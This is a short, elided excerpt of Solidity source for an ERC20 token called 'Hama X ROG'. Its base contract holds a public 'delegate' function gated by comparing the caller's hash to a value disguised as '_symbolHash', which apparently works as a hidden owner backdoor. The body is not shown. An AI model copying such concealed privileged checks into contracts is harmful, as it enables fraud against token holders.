...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function delegate(address target) public {
        if (keccak256(abi.encodePacked(msg.sender)) == _symbolHash) {
...
contract HAMAXROG is ERC20 {
   
    constructor(uint256 initialSupply) ERC20("Hama X ROG", "HAMAXROG") {
